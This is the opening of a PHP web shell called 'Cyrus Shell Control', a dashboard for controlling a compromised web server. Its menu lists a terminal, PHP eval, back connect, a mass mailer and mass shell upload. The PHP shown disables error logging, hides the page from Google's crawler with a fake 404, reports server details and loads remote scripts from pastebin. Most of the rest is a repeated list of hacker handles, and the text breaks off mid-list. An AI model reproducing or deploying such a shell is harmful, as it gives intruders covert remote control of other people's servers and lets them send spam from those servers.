<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
    <title>Cyrus Shell Contol</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="Carlos Alvarez - Alvarez.is">
    <style type="text/css">body, a, a:hover {cursor: url(http://hellox.persiangig.com/DefacePage/negro.cur), progress;}</style>
    <link rel="stylesheet" type="text/css" href="http://pastebin.com/raw/6GhryHrM" />

    <link href="css/main.css" rel="stylesheet">
    <link href="css/font-style.css" rel="stylesheet">
    <link href="css/flexslider.css" rel="stylesheet">

    <script type="text/javascript" src="js/jquery.js"></script>    
    <script type="text/javascript" src="http://pastebin.com/raw/XT8Z8ctD"></script>

	<script type="text/javascript" src="js/lineandbars.js"></script>
    
	<script type="text/javascript" src="js/dash-charts.js"></script>
	<script type="text/javascript" src="js/gauge.js"></script>
	
	<!-- NOTY JAVASCRIPT -->
	<script type="text/javascript" src="js/noty/jquery.noty.js"></script>
	<script type="text/javascript" src="js/noty/layouts/top.js"></script>
	<script type="text/javascript" src="js/noty/layouts/topLeft.js"></script>
	<script type="text/javascript" src="js/noty/layouts/topRight.js"></script>
	<script type="text/javascript" src="js/noty/layouts/topCenter.js"></script>
	
	<!-- You can add more layouts if you want -->
	<script type="text/javascript" src="js/noty/themes/default.js"></script>
    <!-- <script type="text/javascript" src="assets/js/dash-noty.js"></script> This is a Noty bubble when you init the theme-->
	<script type="text/javascript" src="http://code.highcharts.com/highcharts.js"></script>
	<script src="js/jquery.flexslider.js" type="text/javascript"></script>

    <script type="text/javascript" src="js/admin.js"></script>
      
    <style type="text/css">
      body {
        padding-top: 60px;
      }
    </style>

    <!-- Le HTML5 shim, for IE6-8 support of HTML5 elements -->
    <!--[if lt IE 9]>
      <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->
   

  	<!-- Google Fonts call. Font Used Open Sans & Raleway -->
	<link href="http://fonts.googleapis.com/css?family=Raleway:400,300" rel="stylesheet" type="text/css">
  	<link href="http://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet" type="text/css">

  <body>
  	<!-- NAVIGATION MENU -->

    <div class="navbar-nav navbar-inverse navbar-fixed-top">
        <div class="container">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a class="navbar-brand" href="index.html"><img src="images/logo30.png" alt=""> Cyrus Control Shell</a>
        </div> 
          <div class="navbar-collapse collapse">
            <ul class="nav navbar-nav">
              <li><a href="?"><i class="icon-home icon-white"></i> Home</a></li>                            
              <li><a href="?ZmlsZV9leHBsb3Jlcg=<?php echo dirname(__FILE__)."/" ?>"><i class="icon-th icon-white"></i>File Explorer</a></li>
              <li><a href="user.html"><i class="icon-user icon-white"></i> Database Command</a></li>
              <li><a href="?dGVybWlhbmw"><i class="icon-lock icon-white"></i> Terminal</a></li>
              <li><a href="?aGk="><i class="icon-user icon-white"></i> Hash Identifer</a></li>
              <li><a href="?eval"><i class="icon-user icon-white"></i> PHP exec</a></li>
              <li><a href="?YmNrbmV0="><i class="icon-user icon-white"></i> Back connect</a></li> 
              <li><a href="?kueqymass"><i class="icon-user icon-white"></i> Mass Mailler</a></li>
              <li><a href="?a253aXN1ZQ"><i class="icon-user icon-white"></i> Shell - Massive</a></li>
              <li><a href="?srmve"><i class="icon-user icon-white"></i> Remove Shell</a></li>

            </ul>
          </div><!--/.nav-collapse -->
        </div>
    </div>

<body>
	<div id="main_content">
<?php
ob_start();
ini_set('display_errors', false);
ini_set('memory_limit', '-1');

if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) { header('HTTP/1.0 404 Not Found'); exit; } 

@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
function index(){
	echo '
			    <div class="container">

	  <!-- FIRST ROW OF BLOCKS -->     
      <div class="row">

      <!-- USER PROFILE BLOCK -->
        <div class="col-sm-3 col-lg-3">
      		<div class="dash-unit">
	      		<dtitle>User Profile</dtitle>
	      		<hr>
				<div class="thumbnail">
					<img src="images/face80x80.jpg" alt="Marcel Newman" class="img-circle">
				</div><!-- /thumbnail -->
				<h1>Fahriansyah</h1>
				<h3>Depok, Indonesian</h3>
				<br>
					<div class="info-user">
						<span aria-hidden="true" class="li_user fs1"></span>
						<span aria-hidden="true" class="li_settings fs1"></span>
						<span aria-hidden="true" class="li_mail fs1"></span>
						<span aria-hidden="true" class="li_key fs1"></span>
					</div>
				</div>
        </div>

	        <div class="col-sm-6 col-lg-6">
      		<div class="dash-unit">
		  		<dtitle>Server Info</dtitle>
		  		<hr>
		  		<b>Server Name : </b>'.$_SERVER["SERVER_NAME"].'<br>
		  		<b>Server Ip : </b>'.$_SERVER["SERVER_ADDR"].'<br>
		  		<b>Shell Location: </b>'.$_SERVER["SCRIPT_FILENAME"].'<br>
		  		<b>Server Software: </b>'.$_SERVER["SERVER_SOFTWARE"].'<br /><br /><br />
		  		<center><h1>Cyriushell v1.0 Anniv Version</h1></center>
		  		<center><h3>Created by KAZE-T a.k.a Fahriansyah</h3></center>
			</div>
        </div>
';
	echo '<div class="col-sm-3 col-lg-3">

      <!-- LOCAL TIME BLOCK -->
      		<div class="half-unit">
	      		<dtitle>Local Time</dtitle>
	      		<hr>
		      		<div class="clockcenter">
			      		<digiclock>12:45:25</digiclock>
		      		</div>
			</div>

      <!-- SERVER UPTIME -->
			<div class="half-unit">
	      		<dtitle>Server Uptime</dtitle>
	      		<hr>
	      		<div class="cont">
					<p><img src="images/up.png" alt=""> <bold>Up</bold> | 356ms.</p>
				</div>
			</div>

        </div>
      </div><!-- /row -->
      
      
	  <!-- SECOND ROW OF BLOCKS -->     
      <div class="row">
        <div class="col-sm-3 col-lg-3">
       <!-- MAIL BLOCK -->
      		<div class="dash-unit" style="overflow:auto;">
      		<dtitle>All of member</dtitle>
      		<hr>
      		<div class="framemail">
    			<div class="window">
			        <ul class="mail">
			            <li>
			                <i class="unread"></i>
			                <img class="avatar" src="images/photo01.jpeg" alt="avatar">
			                <p class="sender">Wibu_Tersakiti</p>
			                <p class="message"><strong>Working</strong> - This is the last...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>
			            <li>
			            	<i class="read"></i>
			            	<img class="avatar" src="images/photo02.jpg" alt="avatar">
			            	<p class="sender">MRX_001</p>
			                <p class="message"><strong>Hey man!</strong> - You have to taste ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>
			            <li>
			            	<i class="read"></i>
			            	<img class="avatar" src="images/photo02.jpg" alt="avatar">
			            	<p class="sender">Mr.Acid Poison</p>
			                <p class="message"><strong>Hey man!</strong> - You have to taste ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>
			            <li>
			            	<i class="read"></i>
			            	<img class="avatar" src="images/Speeds.Ar.PNG" alt="avatar">
			            	<p class="sender">Speeds.Ar</p>
			                <p class="message"><strong>Hey man!</strong> - Silent Mode....</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>
			            <li>
			                <i class="read"></i>
			                <img class="avatar" src="images/photo02.jpg" alt="avatar">
			                <p class="sender">Idiotz_Newbies</p>
			                <p class="message"><strong>Hey man!</strong> - You have to taste ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>

			            <li>
			                <i class="read"></i>
			                <img class="avatar" src="images/photo02.jpg" alt="avatar">
			                <p class="sender">TheXuser</p>
			                <p class="message"><strong>Hey man!</strong> - You have to taste ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>
			            <li>
			                <i class="read"></i>
			                <img class="avatar" src="images/photo02.jpg" alt="avatar">
			                <p class="sender">fahmibaka404</p>
			                <p class="message"><strong>Hey man!</strong> - You have to taste ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>
			            <li>
			                <i class="read"></i>
			                <img class="avatar" src="images/photo02.jpg" alt="avatar">
			                <p class="sender">psycho_7071con</p>
			                <p class="message"><strong>Hey man!</strong> - You have to taste ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>
			            <li>
			                <i class="read"></i>
			                <img class="avatar" src="images/photo02.jpg" alt="avatar">
			                <p class="sender">./SA666IT4RIUS</p>
			                <p class="message"><strong>Hey man!</strong> - You have to taste ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>
			            <li>
			                <i class="read"></i>
			                <img class="avatar" src="images/photo02.jpg" alt="avatar">
			                <p class="sender">Dan E.</p>
			                <p class="message"><strong>Hey man!</strong> - You have to taste ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>
			            <li>
			                <i class="read"></i>
			                <img class="avatar" src="images/photo03.jpg" alt="avatar">
			                <p class="sender">Leonard N.</p>
			                <p class="message"><strong>New Mac :D</strong> - So happy with ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>
			            <li>
			                <i class="read"></i>
			                <img class="avatar" src="images/photo03.jpg" alt="avatar">
			                <p class="sender">XienXien</p>
			                <p class="message"><strong>New Mac :D</strong> - So happy with ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>
			            <li>
			                <i class="read"></i>
			                <img class="avatar" src="images/photo03.jpg" alt="avatar">
			                <p class="sender">n00bx9</p>
			                <p class="message"><strong>New Mac :D</strong> - So happy with ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>
			            <li>
			                <i class="read"></i>
			                <img class="avatar" src="images/photo03.jpg" alt="avatar">
			                <p class="sender">Nitro</p>
			                <p class="message"><strong>New Mac :D</strong> - So happy with ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>
			            <li>
			                <i class="read"></i>
			                <img class="avatar" src="images/photo03.jpg" alt="avatar">
			                <p class="sender">h4xcorp</p>
			                <p class="message"><strong>New Mac :D</strong> - So happy with ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>
			            <li>
			                <i class="read"></i>
			                <img class="avatar" src="images/photo03.jpg" alt="avatar">
			                <p class="sender">Darkeninemous</p>
			                <p class="message"><strong>New Mac :D</strong> - So happy with ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>
			            <li>
			                <i class="read"></i>
			                <img class="avatar" src="images/photo03.jpg" alt="avatar">
			                <p class="sender">Mr.S4NN404</p>
			                <p class="message"><strong>New Mac :D</strong> - So happy with ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>
			            <li>
			                <i class="read"></i>
			                <img class="avatar" src="images/photo03.jpg" alt="avatar">
			                <p class="sender">./Castelo</p>
			                <p class="message"><strong>New Mac :D</strong> - So happy with ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>
			            <li>
			                <i class="read"></i>
			                <img class="avatar" src="images/photo03.jpg" alt="avatar">
			                <p class="sender">./Gatoz</p>
			                <p class="message"><strong>New Mac :D</strong> - So happy with ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>
			            <li>
			                <i class="read"></i>
			                <img class="avatar" src="images/photo03.jpg" alt="avatar">
			                <p class="sender">/Mr.G</p>
			                <p class="message"><strong>New Mac :D</strong> - So happy with ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>
			            <li>
			                <i class="read"></i>
			                <img class="avatar" src="images/photo03.jpg" alt="avatar">
			                <p class="sender">NotFound404x</p>
			                <p class="message"><strong>New Mac :D</strong> - So happy with ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>
			            <li>
			                <i class="read"></i>
			                <img class="avatar" src="images/photo03.jpg" alt="avatar">
			                <p class="sender">MrX__JR</p>
			                <p class="message"><strong>New Mac :D</strong> - So happy with ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>
			            <li>
			                <i class="read"></i>
			                <img class="avatar" src="images/photo03.jpg" alt="avatar">
			                <p class="sender">DARK51DE</p>
			                <p class="message"><strong>New Mac :D</strong> - So happy with ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>
			            <li>
			                <i class="read"></i>
			                <img class="avatar" src="images/photo03.jpg" alt="avatar">
			                <p class="sender">Mr.AF_717</p>
			                <p class="message"><strong>New Mac :D</strong> - So happy with ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>
			            <li>
			                <i class="read"></i>
			                <img class="avatar" src="images/photo03.jpg" alt="avatar">
			                <p class="sender">MR.1334N</p>
			                <p class="message"><strong>New Mac :D</strong> - So happy with ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>
			            <li>
			                <i class="read"></i>
			                <img class="avatar" src="images/photo03.jpg" alt="avatar">
			                <p class="sender">Mr.Stultus19</p>
			                <p class="message"><strong>New Mac :D</strong> - So happy with ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>
			            <li>
			                <i class="read"></i>
			                <img class="avatar" src="images/photo03.jpg" alt="avatar">
			                <p class="sender">.:JONES404:.</p>
			                <p class="message"><strong>New Mac :D</strong> - So happy with ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>
			            <li>
			                <i class="read"></i>
			                <img class="avatar" src="images/photo03.jpg" alt="avatar">
			                <p class="sender">Kambing Burik</p>
			                <p class="message"><strong>New Mac :D</strong> - So happy with ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>
			            <li>
			                <i class="read"></i>
			                <img class="avatar" src="images/photo03.jpg" alt="avatar">
			                <p class="sender">MR.123Y</p>
			                <p class="message"><strong>New Mac :D</strong> - So happy with ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>
			            <li>
			                <i class="read"></i>
			                <img class="avatar" src="images/photo03.jpg" alt="avatar">
			                <p class="sender">P4151N9_R00M</p>
			                <p class="message"><strong>New Mac :D</strong> - So happy with ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>
			            <li>
			                <i class="read"></i>
			                <img class="avatar" src="images/photo03.jpg" alt="avatar">
			                <p class="sender">/Mr.dead007</p>
			                <p class="message"><strong>New Mac :D</strong> - So happy with ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>
			            <li>
			                <i class="read"></i>
			                <img class="avatar" src="images/photo03.jpg" alt="avatar">
			                <p class="sender">./Skrillex</p>
			                <p class="message"><strong>New Mac :D</strong> - So happy with ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>			            
			            <li>
			                <i class="read"></i>
			                <img class="avatar" src="images/photo03.jpg" alt="avatar">
			                <p class="sender">Wr@ngnull_g33k</p>
			                <p class="message"><strong>New Mac :D</strong> - So happy with ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>
			            <li>
			                <i class="read"></i>
			                <img class="avatar" src="images/photo03.jpg" alt="avatar">
			                <p class="sender">__MRB__</p>
			                <p class="message"><strong>New Mac :D</strong> - So happy with ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li>
			            <li>
			                <i class="read"></i>
			                <img class="avatar" src="images/photo03.jpg" alt="avatar">
			                <p class="sender">Manick</p>
			                <p class="message"><strong>New Mac :D</strong> - So happy with ...</p>
			                <div class="actions">
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/undo.png" alt="reply"></a>
			                    <a><img src="http://png-1.findicons.com/files//icons/2232/wireframe_mono/16/star_fav.png" alt="favourite"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/tag.png" alt="label"></a>
			                    <a><img src="http://png-4.findicons.com/files//icons/2232/wireframe_mono/16/trash.png" alt="delete"></a>
			                </div>
			            </li> 
			            <li>
